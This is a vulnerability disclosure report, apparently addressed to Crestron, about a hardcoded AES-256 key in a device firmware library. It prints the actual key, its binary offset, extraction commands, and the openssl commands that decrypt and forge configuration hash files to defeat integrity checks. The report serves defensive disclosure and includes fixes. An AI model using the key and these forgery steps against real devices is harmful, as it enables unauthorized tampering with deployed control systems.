# [REDACTED-ID]_001: Hardcoded AES-256 Encryption Key

| Field | Value |
|-------|-------|
| **Finding ID** | [REDACTED-ID]_001 |
| **Title** | Hardcoded AES-256 Encryption Key in Device Configuration Handler |
| **Severity** | HIGH (CVSS 3.1: 7.4 — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N) |
| **Type** | CWE-321: Use of Hard-coded Cryptographic Key |
| **Affected Products** | DMPS3-4K-STR, DM-TXRX-100-STR, DGE-100, TS-1542, DM-DGE-200-C, TS-1542-C, MERCURY, and all Crestron devices sharing the FW 2.x codebase |
| **Firmware Analyzed** | DMPS3 AirMedia PufVersion 1.5010.00023 (Build: February 23, 2024) |
| **Discovery Method** | Static analysis of `libCrestronProtocolHandler.so` via radare2 decompilation |
| **Date Discovered** | 2026-03-03 |
| **Researchers** | [REDACTED] Team |

---

## Summary

The `DeviceConfig` class in `libCrestronProtocolHandler.so` contains a hardcoded AES-256-CBC encryption key (`CTtQa9!sdBDn`) stored as a static string at binary offset `0x1018c3`. This key is used by the `hashEncryptUsingAes()` and `hashDecryptUsingAes()` functions to encrypt and decrypt device configuration hash files. Both functions construct an OpenSSL command line and execute it via `system()`, passing the hardcoded key as a plaintext password argument.

Any attacker with access to the firmware image (freely downloadable from Crestron's Resource Library) can extract this key and use it to decrypt configuration hash files extracted from any device running this firmware. Conversely, the attacker can forge encrypted hash files that will pass the device's `validateHashFile()` integrity checks, bypassing configuration integrity protections.

---

## Affected Component

| Component | Details |
|-----------|---------|
| **Binary** | `libCrestronProtocolHandler.so` (2.1 MB, ARM32 EABI5) |
| **Class** | `DeviceConfig` |
| **Key Member** | `DeviceConfig::m_EncryptionKey` |
| **Key Value** | `CTtQa9!sdBDn` |
| **Key Offset** | `0x1018c3` in `libCrestronProtocolHandler.so` |
| **Encrypt Function** | `hashEncryptUsingAes()` at `0x836dc` |
| **Decrypt Function** | `hashDecryptUsingAes()` (same pattern) |
| **Callers** | `createHashFileUsingMd5Sum()`, `validateHashFile()` |
| **Source Reference** | `DeviceConfig.cpp` lines 1077-1090 (per debug symbols / RTTI) |

---

## Technical Details

### 2.1 The Hardcoded Key

The string `CTtQa9!sdBDn` is stored in the `.rodata` section of `libCrestronProtocolHandler.so` at offset `0x1018c3`. It is loaded into the `DeviceConfig::m_EncryptionKey` member during object construction and used as the sole encryption passphrase for all AES-256-CBC operations on configuration hash files.

### 2.2 Encryption/Decryption Functions

Both `hashEncryptUsingAes()` and `hashDecryptUsingAes()` follow the same pattern:

```c
// Reconstructed from r2 decompilation of hashEncryptUsingAes() at 0x836dc
void DeviceConfig::hashEncryptUsingAes(char *input_file, char *output_file) {
    char cmd[512];
    snprintf(cmd, sizeof(cmd),
        "openssl enc -aes-256-cbc -salt -in %s -out %s -pass pass:%s",
        input_file, output_file, m_EncryptionKey);  // m_EncryptionKey = "CTtQa9!sdBDn"
    system(cmd);
}

void DeviceConfig::hashDecryptUsingAes(char *input_file, char *output_file) {
    char cmd[512];
    snprintf(cmd, sizeof(cmd),
        "openssl enc -aes-256-cbc -d -salt -in %s -out %s -pass pass:%s",
        input_file, output_file, m_EncryptionKey);
    system(cmd);
}
```

The radare2 decompilation at `0x836dc` shows:
1. The key string is loaded from a static data reference into a register
2. It is passed to `snprintf()` to construct the OpenSSL command line
3. The resulting command is passed directly to `system()`

### 2.3 Usage Context

These functions are called from:

- **`createHashFileUsingMd5Sum()`** — Generates an MD5 hash of the device configuration, then encrypts the hash file using AES-256-CBC with the hardcoded key. This creates an integrity stamp for the configuration.
- **`validateHashFile()`** — Decrypts a stored hash file using the same hardcoded key, then compares the decrypted MD5 hash against the current configuration state to verify integrity.

### 2.4 Key Extraction Trivially Achievable

The firmware PUF file (`dmps3_airmedia_1.5010.00023.puf`, 283 MB) is freely downloadable from Crestron's Resource Library. The key can be extracted in seconds:

```bash
# Extract system.img from PUF, mount it, and read the key directly
strings libCrestronProtocolHandler.so | grep -A1 -B1 "CTtQa9"
# Or at known offset:
dd if=libCrestronProtocolHandler.so bs=1 skip=$((0x1018c3)) count=12 2>/dev/null
```

### 2.5 OpenSSL Command Line Exposure

The key is passed via `system("openssl enc ... -pass pass:CTtQa9!sdBDn ...")`. This means:
- The key appears in the process command line, visible via `/proc/*/cmdline` to any local process
- The key appears in shell history if the command is logged
- The key is visible to any process monitoring tool (e.g., `ps aux`)

---

## Impact

| Scenario | Impact | Severity |
|----------|--------|----------|
| Configuration hash file decryption | Attacker reads device configuration integrity data | MEDIUM |
| Configuration hash file forgery | Attacker creates forged hash files that pass `validateHashFile()` | HIGH |
| Configuration integrity bypass | Modified device configurations pass integrity checks | HIGH |
| Cross-device applicability | Same key on ALL devices running this firmware | HIGH |
| Combined with firmware download | Key extracted without any device access | HIGH |

### Attack Scenario

1. Attacker downloads DMPS3 firmware from Crestron's public Resource Library
2. Attacker extracts `libCrestronProtocolHandler.so` from the firmware image
3. Attacker reads the hardcoded key `CTtQa9!sdBDn` from offset `0x1018c3`
4. If the attacker gains filesystem access to a target device (via SSH with default credentials, or another vulnerability), they can:
   - Decrypt any configuration hash file: `openssl enc -aes-256-cbc -d -salt -in hash.enc -out hash.dec -pass pass:CTtQa9!sdBDn`
   - Modify the device configuration
   - Re-encrypt a forged hash file: `openssl enc -aes-256-cbc -salt -in forged_hash -out hash.enc -pass pass:CTtQa9!sdBDn`
   - The device's `validateHashFile()` will accept the forged hash as valid

---

## Evidence

### Binary String Evidence

```
$ r2 -q -c 'iz~CTtQa9' libCrestronProtocolHandler.so
0x001018c3  12  13  .rodata  ascii  CTtQa9!sdBDn
```

### Decompilation of hashEncryptUsingAes (0x836dc)

The radare2 decompilation shows the function loading the key from static data, formatting it into an OpenSSL command via `snprintf()`, and executing via `system()`. The key is never derived, rotated, or fetched from a secure store -- it is a compile-time constant.

### Cross-Reference

```
$ r2 -q -c 'axt @ 0x1018c3' libCrestronProtocolHandler.so
  → hashEncryptUsingAes (0x836dc)
  → hashDecryptUsingAes
  → DeviceConfig constructor
```

---

## Reproduction Steps (for vendor)

1. Obtain the DMPS3 AirMedia firmware PUF file (version 1.5010.00023)
2. Extract the `system.img` filesystem using binwalk:
   ```bash
   binwalk -e dmps3_airmedia_1.5010.00023.puf
   mount -o loop,ro system.img /mnt/fw
   ```
3. Extract the key from the binary:
   ```bash
   strings /mnt/fw/system/lib/libCrestronProtocolHandler.so | grep "CTtQa9"
   # Output: CTtQa9!sdBDn
   ```
4. Locate any encrypted hash file on a running device (typically under the device configuration directory)
5. Decrypt using the extracted key:
   ```bash
   openssl enc -aes-256-cbc -d -salt -in <hash_file> -out decrypted.txt -pass pass:CTtQa9!sdBDn
   ```
6. Modify the decrypted content and re-encrypt:
   ```bash
   openssl enc -aes-256-cbc -salt -in modified.txt -out <hash_file> -pass pass:CTtQa9!sdBDn
   ```
7. Replace the hash file on the device -- `validateHashFile()` will accept the forged file

---

## Suggested Fix

1. **Remove the hardcoded key entirely.** Replace it with a per-device unique key derived from device-specific entropy (e.g., hardware serial number, TPM-backed key, or a key provisioned during manufacturing).
2. **Use the OpenSSL C library API** (`libcrypto`) instead of shelling out via `system()`. This eliminates the key appearing in process command lines and removes the `system()` command injection surface.
3. **Key storage:** If a symmetric key must be stored on the device, store it in a protected keystore or derive it using a key derivation function (KDF) from device-specific secrets, not a compile-time constant.
4. **Integrity mechanism up[REDACTED]:** Consider replacing the MD5-hash-then-AES-encrypt scheme with an HMAC (e.g., HMAC-SHA256) using a per-device key, which provides both integrity and authenticity in a single cryptographic operation.

---

## Status

| Item | Status |
|------|--------|
| **Discovery** | Confirmed via static analysis (radare2 decompilation) |
| **Key extraction** | Confirmed -- key readable from binary |
| **Live validation** | Pending -- requires device filesystem access to test hash file forgery |
| **Exploitability** | HIGH -- key is publicly extractable from downloadable firmware |

---

## CWE Reference

- **CWE-321:** Use of Hard-coded Cryptographic Key
- **CWE-798:** Use of Hard-coded Credentials (related -- the key functions as a credential for the encryption scheme)
- **Related:** CWE-259 (Use of Hard-coded Password), CWE-327 (Use of a Broken or Risky Cryptographic Algorithm -- MD5 for integrity)
